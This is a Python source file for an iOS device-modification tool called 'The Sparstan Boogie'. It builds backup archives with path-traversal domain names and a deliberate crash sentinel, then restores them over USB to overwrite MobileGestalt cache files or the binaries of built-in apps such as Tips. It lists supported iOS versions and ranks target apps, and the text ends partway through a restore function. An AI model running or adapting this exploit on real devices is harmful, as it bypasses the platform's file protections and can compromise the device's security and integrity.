"""The Sparstan Boogie."""

import os
import sys
import warnings
import urllib.parse as urllib
import traceback
import asyncio
import inspect
import time
import shutil
import importlib.metadata
import subprocess
import runpy
import hashlib
import plistlib
import json
from datetime import datetime
from pathlib import Path
from tempfile import TemporaryDirectory

PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

warnings.filterwarnings(
    "ignore",
    message=r".*urllib3 v2 only supports OpenSSL 1\.1\.1\+.*",
)

try:
    from urllib3.exceptions import NotOpenSSLWarning
except Exception:
    NotOpenSSLWarning = None

if NotOpenSSLWarning is not None:
    warnings.filterwarnings("ignore", category=NotOpenSSLWarning)

MIN_PYTHON = (3, 8)

if sys.version_info < MIN_PYTHON:
    print(
        f"This script expects Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]} or newer."
    )
    print(f"Current interpreter: {sys.version.split()[0]}")
    print("Run with: python3 sparse_tool/main.py")
    sys.exit(1)


MISSING_DEPS = []
MISSING_DEP_ERRORS = {}
_SYNC_LOOP = None
PYMOBILEDEVICE3_VERSION = None
LAST_SUMMARY_CODE = "SRD_UNKNOWN"
PLIST_LAYOUT_SELECTED = "legacy"
NO_SENTINELS_SELECTED = False
PAYLOAD_BYTES_OVERRIDE = None
LAST_APPLY_CONFIDENCE = "unknown"
BACKUP_COMPAT_MODE = False


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    WHITE = "\033[37m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"


def _c(text, color):
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _print_intro():
    script_name = os.path.basename(sys.argv[0]) if sys.argv else "sparse.py"
    py_cmd = os.path.basename(sys.executable) if sys.executable else "python3"
    print(_c("==============================================", C.CYAN))
    print(_c("           THE SPARSTAN BOOGIE", C.MAGENTA))
    print(_c("==============================================", C.CYAN))
    print(
        _c('"No plan survives first contact." - Helmuth von Moltke', C.YELLOW)
    )
    print("")
    print("")
    print(_c(f"Script: {script_name}", C.BLUE))
    print(
        _c(
            f"Run: {py_cmd} sparse_tool/main.py <from_path> [--plist-name <name>]",
            C.GREEN,
        )
    )
    print(
        _c(
            "Source Python build.",
            C.CYAN,
        )
    )
    print("")
    print(_c("Top Used Syntax:", C.CYAN))
    print(_c("  Sparse app-target:", C.WHITE))
    print(_c("    python3 main.py <from_path> --target \"Tips\"", C.WHITE))
    print(_c("  Gestalt-chain:", C.WHITE))
    print(_c("    python3 main.py <from_path> --gestalt-chain", C.WHITE))
    print("")


REPLACEABLE_APP_NAMES = [
    "Activity",
    "Apple Books",
    "Apple TV",
    "Calculator",
    "Calendar",
    "Clock",
    "Compass",
    "Contacts",
    "FaceTime",
    "Files",
    "Find My",
    "Freeform",
    "Health",
    "Home",
    "iTunes Store",
    "Mail",
    "Maps",
    "Measure",
    "Music",
    "News",
    "Notes",
    "Podcasts",
    "Reminders",
    "Shortcuts",
    "Stocks",
    "Tips",
    "Translate",
    "TV",
    "Voice Memos",
    "Wallet",
    "Watch",
    "Weather",
]

LOW_IMPACT_TARGET_PRIORITY = [
    "Calculator",
    "Tips",
    "Clock",
    "Measure",
    "Voice Memos",
    "Stocks",
    "Weather",
    "News",
]

MOBILEGESTALT_CACHE_DIR = (
    "/var/containers/Shared/SystemGroup/"
    "systemgroup.com.apple.mobilegestaltcache/Library/Caches"
)
GESTALT_CHAIN_FILES = (
    "BLDatabaseManager.sqlite",
    "CloudConfigurationDetails.plist",
    "com.apple.purplebuddy.plist",
)


def _get_sync_loop():
    global _SYNC_LOOP
    if _SYNC_LOOP is None or _SYNC_LOOP.is_closed():
        _SYNC_LOOP = asyncio.new_event_loop()
        _SYNC_LOOP.set_exception_handler(_asyncio_exception_handler)
        asyncio.set_event_loop(_SYNC_LOOP)
    return _SYNC_LOOP


def _resolve(value):
    if inspect.isawaitable(value):
        loop_getter = getattr(value, "get_loop", None)
        value_loop = loop_getter() if callable(loop_getter) else None
        loop = value_loop or _get_sync_loop()
        return loop.run_until_complete(value)
    return value


def _sanitize_shadowed_stdlib():
    # Avoid accidental local stdlib shadowing (for example, struct.py in CWD).
    # Remove paths that shadow stdlib modules used by this loader.
    project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    filtered = []
    for p in sys.path:
        probe = os.getcwd() if p == "" else p
        probe_abs = os.path.abspath(probe) if probe else ""
        if (
            probe_abs.startswith(project_root)
            and (
            os.path.isfile(os.path.join(probe, "struct.pyc"))
            or os.path.isfile(os.path.join(probe, "struct.py"))
            )
        ):
            continue
        filtered.append(p)
    sys.path[:] = filtered

    # If a local struct module was already imported before sanitization,
    # remove it so later imports resolve to stdlib struct.
    struct_mod = sys.modules.get("struct")
    struct_file = getattr(struct_mod, "__file__", "") if struct_mod else ""
    if struct_file and os.path.abspath(struct_file).startswith(project_root):
        sys.modules.pop("struct", None)

    # Force-load stdlib struct now that sys.path is sanitized.
    __import__("struct")


try:
    _sanitize_shadowed_stdlib()
except Exception:
    pass

try:
    from exploit.restore import restore_file
except ImportError as e:
    restore_file = None
    MISSING_DEPS.append("exploit.restore")
    MISSING_DEP_ERRORS["exploit.restore"] = str(e)

try:
    from pymobiledevice3 import usbmux
    from pymobiledevice3.exceptions import PyMobileDevice3Exception
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.afc import AfcService
    from pymobiledevice3.services.diagnostics import DiagnosticsService
    from pymobiledevice3.services.installation_proxy import InstallationProxyService
    from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
except ImportError as e:
    usbmux = None
    create_using_usbmux = None
    AfcService = None
    DiagnosticsService = None
    InstallationProxyService = None
    Mobilebackup2Service = None

    class PyMobileDevice3Exception(Exception):
        pass

    MISSING_DEPS.append("pymobiledevice3")
    MISSING_DEP_ERRORS["pymobiledevice3"] = str(e)

try:
    PYMOBILEDEVICE3_VERSION = importlib.metadata.version("pymobiledevice3")
except Exception:
    PYMOBILEDEVICE3_VERSION = None


def _major_version(version_text):
    if not version_text:
        return None
    try:
        return int(str(version_text).split(".", 1)[0])
    except Exception:
        return None


def _prompt_yes_no(prompt):
    try:
        response = input(prompt).strip().lower()
    except EOFError:
        return False
    return response in {"y", "yes"}


def _offer_install_pymobiledevice3_fix(target_version="4.25.1"):
    print(_c("Possible fix:", C.CYAN))
    print(f"  {sys.executable} -m pip uninstall -y pymobiledevice3")
    print(f"  {sys.executable} -m pip install pymobiledevice3=={target_version}")
    print("")
    if not _prompt_yes_no("Install this fix now? [y/N]: "):
        print(_c("Skipped automatic fix. Apply the commands above, then rerun.", C.YELLOW))
        return False

    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "uninstall", "-y", "pymobiledevice3"],
            check=True,
        )
        subprocess.run(
            [sys.executable, "-m", "pip", "install", f"pymobiledevice3=={target_version}"],
            check=True,
        )
    except subprocess.CalledProcessError as e:
        print(_c(f"Automatic fix failed with exit code {e.returncode}.", C.RED))
        print(_c("Run the commands above manually, then rerun this tool.", C.YELLOW))
        return False

    print(_c("Dependency fix applied successfully.", C.GREEN))
    print(_c("Reconnect the device, trust/unlock, and rerun the command.", C.YELLOW))
    return True


def _delegate_to_backup_sparse(raw_args, backup_root=None):
    default_local_backup = str(Path(__file__).resolve().parent.parent / "legacy_backup")
    root = backup_root or default_local_backup
    script = Path(root) / "bin" / "sparse.py"
    if not script.exists():
        raise RuntimeError(
            f"Backup sparse script not found at: {script}. "
            "Clone backup repo there or pass --backup-root <path>."
        )
    print(_c("[Delegate]", C.CYAN))
    print(f"  {_c('Executing backup sparse:', C.YELLOW)} {_c(str(script), C.GREEN)}")
    print(f"  {_c('Python:', C.YELLOW)} {_c(sys.executable, C.GREEN)}")
    print(f"  {_c('Args:', C.YELLOW)} {_c(' '.join(raw_args), C.MAGENTA)}")
    # Run legacy sparse in-process so this repo stays self-contained without
    # spawning another interpreter.
    old_argv = list(sys.argv)
    old_cwd = os.getcwd()
    if root not in sys.path:
        sys.path.insert(0, root)
    sys.argv = [str(script)] + raw_args
    try:
        os.chdir(root)
        runpy.run_path(str(script), run_name="__main__")
    except SystemExit as exc:
        code = exc.code if isinstance(exc.code, int) else 0
        sys.exit(code)
    finally:
        sys.argv = old_argv
        os.chdir(old_cwd)


def _backup_passthrough_args(args):
    drop_next = False
    out = []
    for token in args:
        if drop_next:
            drop_next = False
            continue
        if token in ("--delegate-backup-sparse", "--backup-compat"):
            continue
        if token == "--backup-root":
            drop_next = True
            continue
        out.append(token)
    return out


def _run_legacy_only_mode(args):
    """Legacy delegation compatibility mode (opt-in)."""
    if "--preflight" in args:
        _run_preflight()
        return True

    if "--help" in args or "-h" in args:
        print(_c("Known Working Commands:", C.CYAN))
        print(_c("  1) Sparse app-target (legacy backup engine):", C.WHITE))
        print(_c("     Syntax: python3 main.py <from_path> --target <app_name_or_bundle_id>", C.WHITE))
        print(_c("     Example: python3 main.py trollstorehelper --target \"Tips\"", C.WHITE))
        print(_c("     Example: python3 main.py trollstorehelper --target \"Calculator\"", C.WHITE))
        print(_c("  2) Gestalt-chain (local engine):", C.WHITE))
        print(_c("     Syntax: python3 main.py <from_path> --gestalt-chain", C.WHITE))
        print(_c("     Example: python3 main.py trollstorehelper --gestalt-chain", C.WHITE))
        print(_c("     Required files (must exist next to payload or in project root):", C.WHITE))
        print(_c("       - BLDatabaseManager.sqlite", C.WHITE))
        print(_c("       - CloudConfigurationDetails.plist", C.WHITE))
        print(_c("       - com.apple.purplebuddy.plist", C.WHITE))
        print(_c("     Flow: AFC upload (iTunesMetadata.plist) + restore staging through chain assets.", C.WHITE))
        print(_c("  3) Target enumeration:", C.WHITE))
        print(_c("     Syntax: python3 main.py --list-targets [--user-apps] [--target-bundle-prefix <prefix>]", C.WHITE))
        print(_c("     Example: python3 main.py --list-targets", C.WHITE))
        print(_c("     Example: python3 main.py --list-targets --user-apps", C.WHITE))
        print(_c("  4) Preflight:", C.WHITE))
        print(_c("     Syntax: python3 main.py --preflight", C.WHITE))
        print(_c("     Usage: prints Python/pymobiledevice3/usbmux/lockdown diagnostics.", C.WHITE))
        print(_c("Optional:", C.WHITE))
        print(_c("  --backup-root <path>  (override backup repo path for sparse delegation)", C.WHITE))
        return True

    # Keep gestalt-chain on the local engine path (below in main()).
    if "--gestalt-chain" in args or "--force-gestalt-chain" in args:
        return False

    # Minimal command surface kept for repo cleanup.
    supported_flags = {
        "--list-targets",
        "--user-apps",
        "--target",
        "--target-bundle-prefix",
        "--backup-root",
        "--help",
        "-h",
    }
    value_flags = {"--target", "--target-bundle-prefix", "--backup-root"}

    i = 0
    while i < len(args):
        token = args[i]
        if token.startswith("--"):
            if token not in supported_flags:
                print(_c(f"Unsupported flag in legacy-only mode: {token}", C.RED))
                print("")
                print(_c("Supported commands:", C.CYAN))
                print(_c("  python3 main.py --list-targets", C.WHITE))
                print(_c("  python3 main.py --list-targets --user-apps", C.WHITE))
                print(_c("  python3 main.py <from_path> --target \"Tips\"", C.WHITE))
                print(_c("  python3 main.py <from_path> --target \"Calculator\"", C.WHITE))
                print(_c("  python3 main.py <from_path> --target-bundle-prefix com.apple.", C.WHITE))
                print(_c("  python3 main.py --preflight", C.WHITE))
                sys.exit(1)
            if token in value_flags:
                if i + 1 >= len(args):
                    print(_c(f"Missing value for {token}", C.RED))
                    sys.exit(1)
                i += 2
                continue
        i += 1

    backup_root = None
    if "--backup-root" in args:
        idx = args.index("--backup-root")
        if idx + 1 >= len(args):
            print(_c("Missing value for --backup-root", C.RED))
            sys.exit(1)
        backup_root = urllib.unquote(args[idx + 1]).strip()

    passthrough = _backup_passthrough_args(args)
    _delegate_to_backup_sparse(passthrough, backup_root=backup_root)
    return True


def _run_preflight():
    print(_c("[Preflight]", C.CYAN))
    print(f"  {_c('Python executable:', C.YELLOW)} {_c(sys.executable, C.GREEN)}")
    print(f"  {_c('Python version:', C.YELLOW)} {_c(sys.version.split()[0], C.GREEN)}")
    print(f"  {_c('pymobiledevice3 version:', C.YELLOW)} {_c(str(PYMOBILEDEVICE3_VERSION), C.GREEN)}")
    try:
        devices = _resolve(usbmux.list_devices())
        usb_count = sum(1 for d in devices if getattr(d, "is_usb", False))
        print(f"  {_c('usbmux reachable:', C.YELLOW)} {_c('yes', C.GREEN)}")
        print(f"  {_c('USB devices visible:', C.YELLOW)} {_c(str(usb_count), C.GREEN)}")
    except Exception as exc:
        print(f"  {_c('usbmux reachable:', C.YELLOW)} {_c('no', C.RED)}")
        print(f"  {_c('usbmux error:', C.YELLOW)} {_c(str(exc), C.RED)}")
    try:
        lockdown = get_connected_usb_device()
        if lockdown is None:
            print(f"  {_c('lockdown session:', C.YELLOW)} {_c('not established', C.YELLOW)}")
        else:
            print(f"  {_c('lockdown session:', C.YELLOW)} {_c('ok', C.GREEN)}")
            print(
                f"  {_c('device product version:', C.YELLOW)} "
                f"{_c(str(getattr(lockdown, 'product_version', 'unknown')), C.GREEN)}"
            )
    except Exception as exc:
        print(f"  {_c('lockdown session:', C.YELLOW)} {_c('failed', C.RED)}")
        print(f"  {_c('lockdown error:', C.YELLOW)} {_c(str(exc), C.RED)}")


def _supports_sparse_restore_for_device(lockdown_client):
    try:
        version = str(getattr(lockdown_client, "product_version", "") or "")
        parts = version.split(".")
        major = int(parts[0]) if parts and parts[0] else 0
        minor = int(parts[1]) if len(parts) > 1 and parts[1] else 0
    except Exception:
        # If we cannot parse version, keep current default behavior.
        return True

    # Preserve sparse mode on older iOS versions (e.g. iOS 15/16) and
    # apply Nugget-style upper bounds for newer versions.
    if major < 17:
        return True
    if major == 17:
        return True
    if major == 18:
        return minor <= 1
    return False


def get_connected_usb_device():
    devices = _resolve(usbmux.list_devices())
    for device in devices:
        if not device.is_usb:
            continue
        try:
            lockdown = _resolve(create_using_usbmux(serial=device.serial))
            return lockdown
        except Exception:
            # usbmux sockets can drop during handshake; caller can retry.
            continue
    return None


async def _get_connected_usb_device_async():
    devices = usbmux.list_devices()
    if inspect.isawaitable(devices):
        devices = await devices
    for device in devices:
        if not device.is_usb:
            continue
        lockdown = create_using_usbmux(serial=device.serial)
        if inspect.isawaitable(lockdown):
            lockdown = await lockdown
        return lockdown
    return None


def get_tips_app_path(lockdown):
    apps_json = _resolve(
        InstallationProxyService(lockdown).get_apps(
            application_type="System", calculate_sizes=False
        )
    )
    return apps_json.get("com.apple.tips", {}).get("Path", "")


def _name_for_app(meta, bundle_id):
    return (
        meta.get("CFBundleDisplayName")
        or meta.get("CFBundleName")
        or bundle_id.split(".")[-1]
    )


def _collect_replaceable_targets(apps_json):
    allowed = {n.lower() for n in REPLACEABLE_APP_NAMES}
    targets = []
    for bundle_id, meta in apps_json.items():
        path = meta.get("Path")
        if not path:
            continue
        name = _name_for_app(meta, bundle_id)
        if name.lower() not in allowed:
            continue
        executable = meta.get("CFBundleExecutable") or os.path.splitext(os.path.basename(path))[0]
        targets.append(
            {
                "name": name,
                "bundle_id": bundle_id,
                "path": path,
                "executable": executable,
            }
        )
    targets.sort(key=lambda x: (x["name"].lower(), x["bundle_id"]))
    return targets


def _collect_user_targets(apps_json):
    targets = []
    for bundle_id, meta in apps_json.items():
        path = meta.get("Path")
        if not path:
            continue
        name = _name_for_app(meta, bundle_id)
        executable = meta.get("CFBundleExecutable") or os.path.splitext(os.path.basename(path))[0]
        targets.append(
            {
                "name": name,
                "bundle_id": bundle_id,
                "path": path,
                "executable": executable,
            }
        )
    targets.sort(key=lambda x: (x["name"].lower(), x["bundle_id"]))
    return targets


def _resolve_target_binary_path(selected):
    raw_path = (selected.get("path") or "").replace("/private", "")
    executable = selected.get("executable") or ""
    if not raw_path:
        raise RuntimeError("Target app path missing.")

    # Case 1: metadata already points to the executable file.
    if raw_path.endswith(f"/{executable}") and executable:
        return raw_path

    # Case 2: metadata points to app bundle directory.
    if raw_path.endswith(".app"):
        if executable:
            return f"{raw_path}/{executable}"
        bundle_name = os.path.splitext(os.path.basename(raw_path))[0]
        return f"{raw_path}/{bundle_name}"

    # Case 3: fallback for unexpected formats.
    if executable and not raw_path.endswith(f"/{executable}"):
        return f"{raw_path}/{executable}"
    return raw_path


def _sanitize_plist_name(name):
    candidate = os.path.basename((name or "").strip())
    if candidate.lower().endswith(".plist"):
        candidate = candidate[:-6]
    candidate = candidate.strip().replace("/", "_")
    if not candidate:
        raise RuntimeError("Missing plist target name.")
    return candidate


def _resolve_target_plist_path(name):
    plist_name = _sanitize_plist_name(name)
    return f"{MOBILEGESTALT_CACHE_DIR}/{plist_name}.plist"


def _print_payload_diagnostics(from_path):
    data = Path(from_path).read_bytes()
    sha = hashlib.sha256(data).hexdigest()
    print(_c("[Diagnostics]", C.CYAN))
    print(f"  {_c('Input file:', C.YELLOW)} {_c(from_path, C.GREEN)}")
    print(f"  {_c('Size bytes:', C.YELLOW)} {_c(str(len(data)), C.MAGENTA)}")
    print(f"  {_c('SHA256:', C.YELLOW)} {_c(sha, C.MAGENTA)}")
    if from_path.lower().endswith(".plist"):
        try:
            obj = plistlib.loads(data)
            if isinstance(obj, dict):
                keys = sorted(obj.keys())
                print(f"  {_c('Top-level keys:', C.YELLOW)} {_c(str(len(keys)), C.MAGENTA)}")
                preview = ", ".join(keys[:15])
                if preview:
                    print(f"  {_c('Key preview:', C.YELLOW)} {preview}")
            else:
                print(_c("  Plist root is not a dictionary.", C.YELLOW))
        except Exception as exc:
            print(_c(f"  Could not parse plist for key summary: {exc}", C.YELLOW))


def _set_path_value(obj, dotted_key, value):
    parts = [p for p in dotted_key.split(".") if p]
    if not parts:
        raise RuntimeError(f"Invalid dotted key path: {dotted_key}")
    cur = obj
    for part in parts[:-1]:
        nxt = cur.get(part)
        if nxt is None:
            nxt = {}
            cur[part] = nxt
        if not isinstance(nxt, dict):
            raise RuntimeError(f"Cannot set nested key under non-dict path segment: {part}")
        cur = nxt
    cur[parts[-1]] = value


def _delete_path_key(obj, dotted_key):
    parts = [p for p in dotted_key.split(".") if p]
    if not parts:
        return
    cur = obj
    for part in parts[:-1]:
        nxt = cur.get(part)
        if not isinstance(nxt, dict):
            return
        cur = nxt
    cur.pop(parts[-1], None)


def _load_and_apply_plist_patch(from_path, plist_patch_path):
    raw = Path(from_path).read_bytes()
    root = plistlib.loads(raw)
    if not isinstance(root, dict):
        raise RuntimeError("Input plist root must be a dictionary for --plist-patch.")
    patch = json.loads(Path(plist_patch_path).read_text(encoding="utf-8"))
    if not isinstance(patch, dict):
        raise RuntimeError("Patch file must be a JSON object.")
    set_map = patch.get("set", {})
    delete_list = patch.get("delete", [])
    if set_map and not isinstance(set_map, dict):
        raise RuntimeError("'set' in patch must be a JSON object.")
    if delete_list and not isinstance(delete_list, list):
        raise RuntimeError("'delete' in patch must be a JSON array.")
    changed = []
    for key, value in set_map.items():
        _set_path_value(root, str(key), value)
        changed.append(f"set:{key}")
    for key in delete_list:
        _delete_path_key(root, str(key))
        changed.append(f"delete:{key}")
    return plistlib.dumps(root), changed


def _set_summary(code):
    global LAST_SUMMARY_CODE
    LAST_SUMMARY_CODE = code


def _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode):
    out_dir = Path(__file__).resolve().parent.parent / "run_reports"
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report = {
        "timestamp_local": ts,
        "summary_code": LAST_SUMMARY_CODE,
        "device_product_version": str(getattr(lockdown, "product_version", "unknown")) if lockdown else "unknown",
        "input_file": from_path,
        "plist_name": plist_name,
        "forced_gestalt_chain": bool(gestalt_chain),
        "selected_mode": selected_mode,
        "plist_layout": PLIST_LAYOUT_SELECTED,
        "no_sentinels": NO_SENTINELS_SELECTED,
        "pymobiledevice3_version": PYMOBILEDEVICE3_VERSION,
    }
    out_path = out_dir / f"run_summary_{ts}.json"
    out_path.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(_c(f"Run summary saved: {out_path}", C.CYAN))


def _build_dry_run_matrix(lockdown, from_path, plist_name, gestalt_chain):
    version = str(getattr(lockdown, "product_version", "unknown"))
    sparse_supported = _supports_sparse_restore_for_device(lockdown)
    selected_mode = "gestalt-chain" if gestalt_chain else (
        "plist-sparserestore" if plist_name and sparse_supported else (
            "plist-auto-gestalt-chain" if plist_name else "app-target-sparserestore"
        )
    )
    planned_path = _resolve_target_plist_path(plist_name) if plist_name else None
    matrix = {
        "device_product_version": version,
        "input_file": from_path,
        "plist_name": plist_name,
        "forced_gestalt_chain": bool(gestalt_chain),
        "sparse_supported": bool(sparse_supported),
        "selected_mode": selected_mode,
        "planned_target_path": planned_path,
        "sparserestore_option_sets": [
            {"system": True, "reboot": False, "copy": False, "settings": True, "skip_apps": False},
            {"system": True, "reboot": False, "copy": False, "settings": False, "skip_apps": True},
        ],
        "gestalt_chain_option_sets": [
            {"system": True, "reboot": False, "copy": False, "source": ".", "settings": True, "skip_apps": False},
            {"system": True, "reboot": False, "copy": False, "source": ".", "settings": False, "skip_apps": True},
        ],
    }
    return matrix


def _resolve_restore_identifier(client):
    udid = getattr(client, "udid", None)
    if not isinstance(udid, str) or not udid.strip():
        try:
            udid = client.get_value(key="UniqueDeviceID")
        except Exception:
            udid = None
    if not isinstance(udid, str) or not udid.strip():
        raise RuntimeError("Unable to resolve a valid device UDID for restore.")
    return udid.strip()


def _normalize_backup_layout(backup_dir, restore_identifier):
    backup_root = Path(backup_dir)
    if not restore_identifier:
        return ""

    required = ("Info.plist", "Manifest.plist", "Status.plist")
    udid_dir = backup_root / restore_identifier
    udid_has_required = all((udid_dir / name).exists() for name in required)
    flat_has_required = all((backup_root / name).exists() for name in required)
    if udid_has_required:
        return ""

    if flat_has_required:
        udid_dir.mkdir(parents=True, exist_ok=True)
        for item in backup_root.iterdir():
            if item.name == restore_identifier:
                continue
            shutil.move(str(item), str(udid_dir / item.name))
        return ""

    return "." if flat_has_required else ""


def _make_sparse_backup(from_path, to_path, plist_layout="legacy", no_sentinels=False, payload_bytes=None):
    from exploit import backup as exploit_backup
    e_contents = payload_bytes if payload_bytes is not None else open(from_path, "rb").read()
    if plist_layout == "normalized":
        normalized_domain = (
            "SysContainerDomain-../../../../../../../../var/backup/var/containers/"
            "Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache"
        )
        normalized_relpath = "Library/Caches/" + os.path.basename(to_path)
        files = [
                exploit_backup.Directory("", "RootDomain"),
                exploit_backup.Directory("Library", "RootDomain"),
                exploit_backup.Directory("Library/Preferences", "RootDomain"),
                exploit_backup.ConcreteFile(
                    "Library/Preferences/temp",
                    "RootDomain",
                    owner=501,
                    group=501,
                    contents=e_contents,
                    inode=0,
                ),
                exploit_backup.Directory("", normalized_domain, owner=501, group=501),
                exploit_backup.Directory("Library", normalized_domain, owner=501, group=501),
                exploit_backup.Directory("Library/Caches", normalized_domain, owner=501, group=501),
                exploit_backup.ConcreteFile(
                    normalized_relpath,
                    normalized_domain,
                    owner=501,
                    group=501,
                    contents=b"",
                    inode=0,
                ),
        ]
        if not no_sentinels:
            files.extend(
                [
                    exploit_backup.ConcreteFile(
                    "",
                    "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                    owner=501,
                    group=501,
                    contents=b"",
                ),
                    exploit_backup.ConcreteFile(
                    "", "SysContainerDomain-../../../../../../../../crash_on_purpose", contents=b""
                ),
                ]
            )
        return exploit_backup.Backup(files=files)

    files = [
            exploit_backup.Directory("", "RootDomain"),
            exploit_backup.Directory("Library", "RootDomain"),
            exploit_backup.Directory("Library/Preferences", "RootDomain"),
            exploit_backup.ConcreteFile(
                "Library/Preferences/temp",
                "RootDomain",
                owner=501,
                group=501,
                contents=e_contents,
                inode=0,
            ),
            exploit_backup.Directory(
                "", f"SysContainerDomain-../../../../../../../../var/backup{os.path.dirname(to_path)}", owner=501, group=501
            ),
            exploit_backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{to_path}",
                owner=501,
                group=501,
                contents=b"",
                inode=0,
            ),
    ]
    if not no_sentinels:
        files.extend(
            [
                exploit_backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),
                exploit_backup.ConcreteFile(
                "", "SysContainerDomain-../../../../../../../../crash_on_purpose", contents=b""
            ),
            ]
        )
    return exploit_backup.Backup(files=files)


def _analyze_backup_archive(back, backup_dir, restore_identifier):
    records = back.generate_manifest_db().records
    hashed_entries = []
    missing_hashed_files = []
    duplicate_keys = {}
    warnings = []
    record_preview = []
    seen = set()
    domains = {}
    for rec in records:
        key = f"{rec.domain}::{rec.filename}"
        duplicate_keys[key] = duplicate_keys.get(key, 0) + 1
        domains[rec.domain] = domains.get(rec.domain, 0) + 1
        record_preview.append({"domain": rec.domain, "filename": rec.filename})
        if rec.domain.lower().endswith(".plist"):
            warnings.append(f"Domain ends with .plist: {rec.domain}")
        if key in seen:
            pass
        else:
            seen.add(key)
        if rec.hash:
            if rec.filename == "":
                warnings.append(f"Hashed record has empty filename for domain: {rec.domain}")
            file_id = hashlib.sha1(f"{rec.domain}-{rec.filename}".encode()).digest().hex()
            hashed_entries.append({"domain": rec.domain, "relative_path": rec.filename, "file_id": file_id})
            if not (backup_dir / file_id).exists():
                missing_hashed_files.append(file_id)

    required = ("Info.plist", "Manifest.plist", "Status.plist")
    udid_dir = backup_dir / restore_identifier
    flat_has_required = all((backup_dir / name).exists() for name in required)
    udid_has_required = all((udid_dir / name).exists() for name in required)
    source_identifier = _normalize_backup_layout(str(backup_dir), restore_identifier)
    source_primary = source_identifier or restore_identifier
    if source_identifier == "" and not udid_has_required and flat_has_required:
        source_primary = "."
        warnings.append("Adjusted source selector to '.' based on flat-layout detection.")

    return {
        "manifest_record_count": len(records),
        "hashed_record_count": len(hashed_entries),
        "missing_hashed_files": missing_hashed_files,
        "duplicate_domain_path_keys": [k for k, v in duplicate_keys.items() if v > 1],
        "record_preview": record_preview,
        "warnings": warnings,
        "domains": domains,
        "flat_has_required_files": flat_has_required,
        "udid_has_required_files": udid_has_required,
        "source_selector_primary": source_primary,
        "source_selector_raw": source_identifier,
        "required_files": list(required),
    }


def _validate_sparse_archive(from_path, to_path, lockdown, plist_layout, no_sentinels, payload_bytes=None):
    back = _make_sparse_backup(
        from_path,
        to_path,
        plist_layout=plist_layout,
        no_sentinels=no_sentinels,
        payload_bytes=payload_bytes,
    )
    restore_identifier = _resolve_restore_identifier(lockdown)
    with TemporaryDirectory() as backup_dir:
        backup_root = Path(backup_dir)
        back.write_to_directory(backup_root)
        report = _analyze_backup_archive(back, backup_root, restore_identifier)
    print(_c("[Archive Validation JSON]", C.CYAN))
    print(json.dumps(report, indent=2, sort_keys=True))


def _filter_targets_by_bundle_prefix(targets, prefix):
    if not prefix:
        return targets
    p = prefix.lower()
    return [t for t in targets if t.get("bundle_id", "").lower().startswith(p)]


def _select_target_app(targets, preferred=None):
    if not targets:
        return None

    if preferred:
        p = preferred.lower()
        for t in targets:
            if t["bundle_id"].lower() == p or t["name"].lower() == p:
                return t

    for wanted in LOW_IMPACT_TARGET_PRIORITY:
        for t in targets:
            if t["name"].lower() == wanted.lower():
                return t

    for t in targets:
        if t["name"].lower() == "tips":
            return t

    return targets[0]


def _print_low_impact_target_guidance(targets, preferred=None):
    if preferred:
        return

    names = {t["name"].lower(): t["name"] for t in targets}
    available = []
    missing = []
    for app in LOW_IMPACT_TARGET_PRIORITY:
        if app.lower() in names:
            available.append(app)
        else:
            missing.append(app)

    print(_c("Recommended low-impact targets for best OS stability:", C.CYAN))
    print("  " + ", ".join(available) if available else _c("  None detected.", C.YELLOW))
    if missing:
        print(
            _c(
                "Some low-impact targets are missing. Install/restore these before beginning if possible:",
                C.YELLOW,
            )
        )
        print("  " + ", ".join(missing))
        print(
            _c(
                "Suggestion: install the missing Apple apps from the App Store first, then rerun.",
                C.YELLOW,
            )
        )
    print("")


def _print_target_choices(targets, selected):
    print(_c("Detected replaceable built-in app targets:", C.CYAN))
    for t in targets:
        marker = "=> " if t is selected else "   "
        color = C.MAGENTA if t is selected else C.BLUE
        print(
            f"{marker}{_c(t['name'], color)} "
            f"({_c(t['bundle_id'], C.YELLOW)})"
        )
    if selected:
        print(
            _c(
                f"Selected target: {selected['name']} ({selected['bundle_id']})",
                C.GREEN,
            )
        )


def restart_device(lockdown):
    diagnostics = DiagnosticsService(lockdown)
    _resolve(diagnostics.restart())


def _wait_for_usb_device(timeout_seconds=120, poll_seconds=2, reason="connect"):
    if reason == "reconnect":
        print(_c("Waiting for device to reconnect over USB...", C.CYAN))
    else:
        print(_c("Waiting for USB device...", C.CYAN))
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        try:
            devices = _resolve(usbmux.list_devices())
            if any(getattr(device, "is_usb", False) for device in devices):
                if reason == "reconnect":
                    print(_c("Device reattached.", C.GREEN))
                    print(
                        _c(
                            "You can now unlock the device and run the script again.",
                            C.YELLOW,
                        )
                    )
                return True
        except Exception:
            # During reboot, usbmux queries can fail transiently.
            pass
        time.sleep(poll_seconds)

    if reason == "reconnect":
        print(
            _c(
                "Timed out waiting for USB reconnect. Unlock the device, reconnect USB, then retry.",
                C.YELLOW,
            )
        )
    else:
        print(
            _c(
                "No USB device detected. Connect device, unlock it, tap Trust, then retry.",
                C.YELLOW,
            )
        )
    return False


def restore_tips_app(from_path, to_path, lockdown):
    global LAST_APPLY_CONFIDENCE
    print(_c("[Restore]", C.CYAN))
    print(f"  {_c('Source file:', C.YELLOW)} {_c(from_path, C.GREEN)}")
